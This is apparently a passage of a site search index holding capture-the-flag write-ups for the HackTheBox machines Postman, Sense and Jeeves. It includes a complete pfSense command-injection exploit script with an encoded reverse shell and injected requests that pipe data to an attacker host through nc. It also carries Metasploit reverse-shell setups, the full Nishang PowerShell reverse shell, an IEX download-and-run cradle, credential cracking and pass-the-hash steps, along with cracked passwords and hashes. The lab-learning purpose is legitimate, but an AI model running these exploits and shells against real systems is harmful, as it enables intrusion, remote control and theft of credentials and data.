DES-EDE3-CBC,73E9CEFBCCF5287C\n\nJehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX\ncwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2\n7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6\n...\n</code></pre> <p>First we need to conver this ssh to john Copy the id_rsa.bak to a file.ssh and run the below command to convert it.</p> <p><pre><code>python3 /opt/john/run/ssh2john.py postman.ssh \n\n## Output\npostman.ssh:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e7....\n</code></pre> crack the password with john <pre><code>computer2008\n</code></pre> We can <code>su</code> to math <pre><code>su - Math\n\n## Enter password computer2008\n</code></pre> we can now access Math user.flag <code>7e43584cc8a4a7f75ccb585c93a2f955</code></p> <p>Using the same password to login to the <code>webmin</code> (Matt:computer2008) </p>"},{"location":"HTB/easy/postman/#metasploit","title":"Metasploit","text":"<p>Got root via metasploit  make sure the <code>ssl</code> is set to <code>true</code> <pre><code>sf6 exploit(linux/http/webmin_package_updates_rce) &gt; options\n\nModule options (exploit/linux/http/webmin_package_updates_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   computer2008     no        Password to login with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.129.2.1       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit\n                                         /basics/using-metasploit.html\n   RPORT      10000            yes       The target port (TCP)\n   SSL        true             no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       Base path to Webmin\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   USERNAME   Matt             yes       User to login with\n   VHOST                       no        HTTP server virtual host\n\n\n   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address o\n                                       n the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT  8080             yes       The local port to listen on.\n\n\nPayload options (cmd/unix/reverse_perl):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.16.8       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Unix In-Memory\n\n\n\nView the full module info with the info, or info -d command.\n</code></pre></p>"},{"location":"HTB/easy/postman/#root-flag","title":"root flag","text":"<p><pre><code>cd ls -la /root\ncat /root/root.txt\n</code></pre> <code>47ddaaa1621955d26a50fdc3fed647e0</code></p>"},{"location":"HTB/easy/sense/","title":"Sense","text":""},{"location":"HTB/easy/sense/#enumeration","title":"Enumeration","text":""},{"location":"HTB/easy/sense/#nmap","title":"Nmap","text":"<p><pre><code>sudo nmap -sC -sV -T4 -oN scan.txt 10.129.147.216\n</code></pre> Nmap scan shows two ports open <code>80</code> and <code>443</code> which means we have a webserver. </p>"},{"location":"HTB/easy/sense/#output","title":"output","text":"<p><pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 12:25 EST\nNmap scan report for 10.129.147.216\nHost is up (0.17s latency).\nNot shown: 998 filtered tcp ports (no-response)\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     lighttpd 1.4.35\n|_http-server-header: lighttpd/1.4.35\n|_http-title: Did not follow redirect to https://10.129.147.216/\n443/tcp open  ssl/http lighttpd 1.4.35\n| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US\n| Not valid before: 2017-10-14T19:21:35\n|_Not valid after:  2023-04-06T19:21:35\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Login\n|_http-server-header: lighttpd/1.4.35\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.86 seconds\n</code></pre> when visiting the site at https: we get a default login for <code>pfsense</code>  Googled the default credentials for <code>pfsense</code> is <code>admin</code> <code>pfsense</code> but we are not able to login with the defaul credentials. let's keep going."},{"location":"HTB/easy/sense/#gobuster","title":"Gobuster","text":"<p>Lets run dirbuster to find files and subdirectories. <pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.129.147.216 -k -x txt\n</code></pre> </p>"},{"location":"HTB/easy/sense/#result","title":"Result","text":"<p>Gobuster finds two files with status code <code>200</code> <code>system-users.txt</code> and <code>changelog.txt</code> that we can access and one of them has the username and a hint for the default password <code>pfsense</code>. we logged into the pfsense and we can see the version of psfsene <code>2.1.3 RELEASE</code> </p> <p>Let's google if there is any vulnerability for it on the exploitDB. There's a CVE for this specefic version. https://www.exploit-db.com/exploits/43560</p> <pre><code>#!/usr/bin/env python3\n\n# Exploit Title: pfSense &lt;= 2.1.3 status_rrd_graph_img.php Command Injection.\n# Date: 2018-01-12\n# Exploit Author: absolomb\n# Vendor Homepage: https://www.pfsense.org/\n# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/\n# Version: &lt;=2.1.3\n# Tested on: FreeBSD 8.3-RELEASE-p16\n# CVE : CVE-2014-4688\n\nimport argparse\nimport requests\nimport urllib\nimport urllib3\nimport collections\n\n# pfSense &lt;= 2.1.3 status_rrd_graph_img.php Command Injection.\n# This script will return a reverse shell on specified listener address and port.\n# Ensure you have started a listener to catch the shell before running!\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"--rhost\", help = \"Remote Host\")\nparser.add_argument('--lhost', help = 'Local Host listener')\nparser.add_argument('--lport', help = 'Local Port listener')\nparser.add_argument(\"--username\", help = \"pfsense Username\")\nparser.add_argument(\"--password\", help = \"pfsense Password\")\nargs = parser.parse_args()\n\nrhost = args.rhost\nlhost = args.lhost\nlport = args.lport\nusername = args.username\npassword = args.password\n\n\n# command to be converted into octal\ncommand = \"\"\"\npython -c 'import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"%s\",%s));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\"\"\" % (lhost, lport)\n\n\npayload = \"\"\n\n# encode payload in octal\nfor char in command:\n    payload += (\"\\\\\" + oct(ord(char)).lstrip(\"0o\"))\n\nlogin_url = 'https://' + rhost + '/index.php'\nexploit_url = \"https://\" + rhost + \"/status_rrd_graph_img.php?database=queues;\"+\"printf+\" + \"'\" + payload + \"'|sh\"\n\nheaders = [\n    ('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),\n    ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),\n    ('Accept-Language', 'en-US,en;q=0.5'),\n    ('Referer',login_url),\n    ('Connection', 'close'),\n    ('Upgrade-Insecure-Requests', '1'),\n    ('Content-Type', 'application/x-www-form-urlencoded')\n]\n\n# probably not necessary but did it anyways\nheaders = collections.OrderedDict(headers)\n\n# Disable insecure https connection warning\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclient = requests.session()\n\n# try to get the login page and grab the csrf token\ntry:\n    login_page = client.get(login_url, verify=False)\n\n    index = login_page.text.find(\"csrfMagicToken\")\n    csrf_token = login_page.text[index:index+128].split('\"')[-1]\n\nexcept:\n    print(\"Could not connect to host!\")\n    exit()\n\n# format login variables and data\nif csrf_token:\n    print(\"CSRF token obtained\")\n    login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]\n    login_data = collections.OrderedDict(login_data)\n    encoded_data = urllib.parse.urlencode(login_data)\n\n# POST login request with data, cookies and header\n    login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)\nelse:\n    print(\"No CSRF token!\")\n    exit()\n\nif login_request.status_code == 200:\n        print(\"Running exploit...\")\n# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell\n        try:\n            exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)\n            if exploit_request.status_code:\n                print(\"Error running exploit\")\n        except:\n            print(\"Exploit completed\")\n</code></pre>"},{"location":"HTB/easy/sense/#exploitation","title":"Exploitation","text":""},{"location":"HTB/easy/sense/#manual-exploitation","title":"Manual Exploitation","text":"<p>We going to use the vulnerability <code>https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/</code> to do a command injection via burbsuit.  we can see that the vulnerability is in the <code>Status-&gt;RRD Graph</code> and it will open a page open the image in the new page. we can remove the rest of the text from the url and only leave with  <code>https://10.129.147.216/status_rrd_graph_img.php?database</code> we can add <code>queues</code> to the end as it's mentioned on teh link above. and open <code>bubsuite</code> and <code>intercept on</code>. and send to <code>reapeater</code>.</p> <pre><code>GET /status_rrd_graph_img.php?database=queues;env|nc+10.10.16.10+9002 HTTP/1.1\nHost: 10.129.147.216\nCookie: PHPSESSID=3ae3a7d6e57713b1a4abd15e586d10cf; cookie_test=1739042635\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\nConnection: keep-alive\n</code></pre> <p>You can play with the link but we can inject commands from here. I tried <code>whoami</code> and while listing on my attacker machine I get a <code>root</code> tried a few more commands. i did tri to use the <code>/</code> but its a bad character so we have to find a way to use the <code>/</code> to navigate to other directories. I used the <code>env</code> and got a list of the variable. </p> <p><pre><code>\u279c  Sense-10-129-147-216 nc -lvnp 9002\nlistening on [any] 9002 ...\nconnect to [10.10.16.10] from (UNKNOWN) [10.129.147.216] 13257\nOLDPWD=/\nHOME=/\nPHP_FCGI_MAX_REQUESTS=500\nPATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin\nLANG=en_US.ISO8859-1\nPHP_FCGI_CHILDREN=1\nPWD=/var/db/rrd\n</code></pre> We can use the <code>HOME</code> as it will give us a <code>/</code> to navigate through the files and directories. I start a listener on the kali terminal and save the output to a <code>filesystems.txt</code></p> <p><pre><code>nc -lnvp 90002 &gt; filesystems.txt\n</code></pre> then I change the exploit on the burbsuit repeater.</p> <pre><code>GET /status_rrd_graph_img.php?database=queues;find+${HOME}|nc+10.10.16.10+9002 HTTP/1.1\nHost: 10.129.147.216\nCookie: PHPSESSID=3ae3a7d6e57713b1a4abd15e586d10cf; cookie_test=1739042635\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\nConnection: keep-alive\n</code></pre> <p> Now we can cat the file we see almost all the sytemfiles for <code>pfsense</code>. We can <code>cat</code> the <code>user.txt</code> and <code>root.txt</code>.</p>"},{"location":"HTB/easy/sense/#usertxt","title":"User.txt","text":"<p><pre><code>GET /status_rrd_graph_img.php?database=queues;cat+${HOME}home${HOME}rohit${HOME}user.txt|nc+10.10.16.10+9002 HTTP/1.1\nHost: 10.129.147.216\nCookie: PHPSESSID=3ae3a7d6e57713b1a4abd15e586d10cf; cookie_test=1739042635\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\nConnection: keep-alive\n</code></pre> </p>"},{"location":"HTB/easy/sense/#roottxt","title":"Root.txt","text":"<p><pre><code>GET /status_rrd_graph_img.php?database=queues;cat+${HOME}root${HOME}root.txt|nc+10.10.16.10+9002 HTTP/1.1\nHost: 10.129.147.216\nCookie: PHPSESSID=3ae3a7d6e57713b1a4abd15e586d10cf; cookie_test=1739042635\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\nConnection: keep-alive\n</code></pre> </p>"},{"location":"HTB/easy/sense/#lazy-easy-way","title":"Lazy Easy Way","text":"<p>for this one we use <code>metasploit</code> <pre><code>msf6 exploit(unix/http/pfsense_graph_injection_exec) &gt; options\n\nModule options (exploit/unix/http/pfsense_graph_injection_exec):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   PASSWORD  pfsense          yes       Password to login with\n   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS    10.129.147.216   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT     443              yes       The target port (TCP)\n   SSL       true             no        Negotiate SSL/TLS for outgoing connections\n   USERNAME  rohit            yes       User to login with\n   VHOST                      no        HTTP server virtual host\n\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.16.10      yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(unix/http/pfsense_graph_injection_exec) &gt; set lhost tun0\nlhost =&gt; 10.10.16.10\nmsf6 exploit(unix/http/pfsense_graph_injection_exec) &gt; exploit\n[-] Handler failed to bind to 10.10.16.10:4444:-  -\n[-] Handler failed to bind to 0.0.0.0:4444:-  -\n[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).\n[*] Exploit completed, but no session was created.\nmsf6 exploit(unix/http/pfsense_graph_injection_exec) &gt; set lport 5555\nlport =&gt; 5555\nmsf6 exploit(unix/http/pfsense_graph_injection_exec) &gt; run\n[*] Started reverse TCP handler on 10.10.16.10:5555 \n[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload\n[*] Payload uploaded successfully, executing\n[*] Sending stage (40004 bytes) to 10.129.147.216\n[+] Deleted vQJUb\n[*] Meterpreter session 1 opened (10.10.16.10:5555 -&gt; 10.129.147.216:13036) at 2025-02-08 15:24:10 -0500\n</code></pre> This will give use root access so we can access both <code>user</code> and <code>root</code> flags.</p>"},{"location":"HTB/easy/sense/#user-and-root-flags","title":"User and Root Flags","text":"<pre><code>meterpreter &gt; cd /home/rohit\nmeterpreter &gt; cat user.txt\n8721327cc232073b40d27d9c17e7348b\nmeterpreter &gt; cd /root/\nmeterpreter &gt; cat root.txt\nd08c32a5d4f8c8b10e76eb51a69f1a86\nmeterpreter &gt; \n</code></pre>"},{"location":"HTB/hard/hard/","title":"Hard","text":""},{"location":"HTB/hard/hard/#this-is-hard-box","title":"This is hard box","text":""},{"location":"HTB/meduim/active/","title":"Active","text":""},{"location":"HTB/meduim/active/#this-is-meduim-box","title":"This is meduim box","text":""},{"location":"HTB/meduim/jeeves/","title":"Jeeves","text":""},{"location":"HTB/meduim/jeeves/#nmap","title":"Nmap","text":"<pre><code>nmap -sC -sV -T4 -oN scan.txt $ip\n</code></pre>"},{"location":"HTB/meduim/jeeves/#nmap-result","title":"Nmap Result","text":"<p>As I went through the prot <code>80</code> and port <code>50000</code> i did not find anyting interesting so I starting doing some directory busting by ruing <code>feroxbuster</code> on the port <code>50000</code>.</p>"},{"location":"HTB/meduim/jeeves/#feroxbuster","title":"Feroxbuster","text":"<p>Feroxbuster found a directory <code>askjeeves</code> <pre><code>feroxbuster -u http://10.129.45.32:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n</code></pre> </p> <p>After visting the /askjeeves I was landed in the dashboard but no login credentials.  From the look of it I can see that I already have a anonymous login so I will go through the links and configurations and find where I can inject code or commands. I found that if I go to the <code>Manage Jenkins</code> then to <code>Script consol</code> I can run command in <code>Groovy language</code> </p> <p>As I run a sample command <code>whoami</code> I get the output see the screenshot for result. <pre><code>cmd = \"whoami\"\nprintln cmd.execute().txt\n</code></pre> </p> <p>While searching for a one-liner shell, I came across the Nishang repository on GitHub. I cloned the entire repository to /opt using:</p> <p><pre><code>git clone https://github.com/samratashok/nishang.git /opt/nishang\n</code></pre> Next, I copied the Invoke-PowerShellTcp.ps1 script and modified it by extracting the relevant lines from the highlighted section down to the end of the script. I then updated the IP address and port to match my listener configuration.</p> <p><pre><code>function Invoke-PowerShellTcp \n{ \n&lt;#\n.SYNOPSIS\nNishang script which can be used for Reverse or Bind interactive PowerShell from a target. \n\n.DESCRIPTION\nThis script is able to connect to a standard netcat listening on a port when using the -Reverse switch. \nAlso, a standard netcat can connect to this script Bind to a specific port.\n\nThe script is derived from Powerfun written by Ben Turner &amp; Dave Hardy\n\n.PARAMETER IPAddress\nThe IP address to connect to when using the -Reverse switch.\n\n.PARAMETER Port\nThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.\n\n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\n\nAbove shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on \nthe given IP and port. \n\n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Bind -Port 4444\n\nAbove shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. \n\n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444\n\nAbove shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be\nlistening on the given IP and port. \n\n.LINK\nhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html\nhttps://github.com/nettitude/powershell/blob/master/powerfun.ps1\nhttps://github.com/samratashok/nishang\n#&gt;      \n    [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param(\n\n        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")]\n        [String]\n        $IPAddress,\n\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")]\n        [Int]\n        $Port,\n\n        [Parameter(ParameterSetName=\"reverse\")]\n        [Switch]\n        $Reverse,\n\n        [Parameter(ParameterSetName=\"bind\")]\n        [Switch]\n        $Bind\n\n    )\n\n\n    try \n    {\n        #Connect back if the reverse switch is used.\n        if ($Reverse)\n        {\n            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)\n        }\n\n        #Bind to the provided port if Bind switch is used.\n        if ($Bind)\n        {\n            $listener = [System.Net.Sockets.TcpListener]$Port\n            $listener.start()    \n            $client = $listener.AcceptTcpClient()\n        } \n\n        $stream = $client.GetStream()\n        [byte[]]$bytes = 0..65535|%{0}\n\n        #Send back current username and computername\n        $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\")\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        #Show an interactive PowerShell prompt\n        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n        {\n            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding\n            $data = $EncodedText.GetString($bytes,0, $i)\n            try\n            {\n                #Execute the command on the target.\n                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )\n            }\n            catch\n            {\n                Write-Warning \"Something went wrong with execution of command on the target.\" \n                Write-Error $_\n            }\n            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '\n            $x = ($error[0] | Out-String)\n            $error.clear()\n            $sendback2 = $sendback2 + $x\n\n            #Return the results\n            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n            $stream.Write($sendbyte,0,$sendbyte.Length)\n            $stream.Flush()  \n        }\n        $client.Close()\n        if ($listener)\n        {\n            $listener.Stop()\n        }\n    }\n    catch\n    {\n        Write-Warning \"Something went wrong! Check if the server is reachable and you are using the correct port.\" \n        Write-Error $_\n    }\n}\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 8001\n</code></pre> After we can host this file on the local server on port <code>80</code></p> <p><pre><code>python3 -m http.server 80\n</code></pre> then we can write our commmand to get the shell on the <code>script cosnole</code></p> <p><pre><code>cmd = \"\"\" powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.10:8000/rev.ps1')) \"\"\"\nprintln cmd.execute().text\n</code></pre> now start the listener on the termianl for the port <code>8001</code> as we defined on the script.</p> <p><pre><code>nc -lvnp 8001\n</code></pre> Run the script onliner on the scrip consol of <code>jenkins</code> and we get a shell.</p> <p></p>"},{"location":"HTB/meduim/jeeves/#user-flag","title":"User flag","text":"<pre><code>e3232272596fb47950d59c4cf1e7066a\n</code></pre>"},{"location":"HTB/meduim/jeeves/#privesc","title":"PrivEsc","text":"<p>I looked for ways to find how to get a privillage escalation. Downloaded the <code>powersploit1</code> github repo the <code>dev</code> branch with the <code>-b</code> option</p> <p><pre><code>git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev\n</code></pre> copy the PowerUp.ps1 from the <code>privesc</code>  Directory and set a http server then download it to the target.</p> <p><pre><code># Setting the python3 sampleHttpServer\npython3 -m http.server 8000\n\n## Copy the PowerUp.ps1 to the target machine with the already user access using the IEX WebClient\nIEX(New-Object Net.WebClient).downloadString('http://10.10.16.16:8000/PowerUp.ps1')\n</code></pre> After run the Command at the bottom of the script <code>Invokde-AllChecks</code> </p> <p>In the user <code>kohsuke</code> Documents directory I found a database passkey file that I can copy to my attack machine and work with it. </p> <p>I will use the <code>impacket-smbserver</code> to mount share folder and transfer over the file to my attacker machine.</p> <p><pre><code>impacket-smbserver PleaseSubscribe 'pwd'\n</code></pre> The smb server is listening on the attacker box with the PleaseSubscribe that anyone can write to. On the victim machine we can run</p> <p><pre><code>New-PSDrive -Name \"FollowOnX\" -PSProvider \"FileSystem\" -Root \"\\\\10.10.16.16\\PleaseSubscribe\"\n</code></pre> </p> <p>I can now navigate to the folder by <pre><code>PS C:\\Users\\kohsuke\\Documents&gt; cd FollowOnX:\nPS FollowOnX:\\&gt; \n</code></pre> Now I can copy the file <code>CEH.kdbx</code> to the shared smb folder and access it on the attacker machine.</p> <p><pre><code>cp C:\\Users\\kohsuke\\Documents\\CEH.kdbx .\n</code></pre> As you can see I copied the file to the attacker machine successfully. </p> <p>After running <code>keepass2john</code> on CEH.kdbx, I extracted the hash and successfully cracked it using <code>hashcat</code>. The recovered password, <code>moonshine1</code>, was then used to access the KeePass database by running: <pre><code>keepass2john CEH.kdbx\n</code></pre> Upon entering the password moonshine1, I successfully logged in and retrieved the Administrator password: <code>S1TjAtJHKsugh9oC4VZl</code>.</p> <p></p>"},{"location":"HTB/meduim/jeeves/#pass-the-hash","title":"Pass The Hash","text":"<p>I copied the passwords for <code>administrator</code> and the backup which the username is just a <code>?</code> and it looks like its an <code>NTLM HASH</code> and saved it to a file.</p> <p><pre><code>\u279c  jeeves-10.129.45.32 cat password.txt                    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: password.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 administrator:S1TjAtJHKsugh9oC4VZl\n   2   \u2502 NTLM HASH:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n</code></pre> I used <code>winexe</code> to login to smb</p> <p><pre><code>/usr/bin/winexe -U jenkins\\administrator //10.129.45.32 cmd.exe\n</code></pre> Password for [WORKGROUP\\jenkinsadministrator]:  But it did not work so I tried PASS the NTLM Hash <p><pre><code>/usr/bin/pth-winexe -U jenkins/administrator //10.129.45.32 cmd.exe\n</code></pre> once pass the hash we get root access.</p> <p> Upon accessing the Administrator desktop, I discovered a file named hm.txt and initially assumed it contained the root flag. However, after opening it, I realized that was not the case. The file itself hinted that I needed to dig deeper.</p> <p>By analyzing alternate data streams (ADS), I found that hm.txt contained a hidden root.txt file. Running <code>dir /r</code> revealed the presence of the data stream, but it did not immediately display the root flag. The next challenge was determining how to access the hidden content. <pre><code>dir /r\n</code></pre>  I used the powershell stream command to get the content of the root.txt</p> <pre><code>powershel (Get-Content hm.txt -Stream root.txt)\n</code></pre>"},{"location":"HTB/meduim/jeeves/#root-flag","title":"Root flag","text":"<p><pre><code>afbc5bd4b615a60648cec41c6ac92530\n</code></pre> </p>"},{"location":"THM/Advent%202024/Day_12/","title":"Day 12","text":""},{"location":"THM/Advent%202024/Day_12/#if-i-cant-steal-their-money-ill-steal-their-joy","title":"If I can't steal their money, I'll steal their joy!","text":"<p>** Web Timing and Race Conditions **</p>"}]}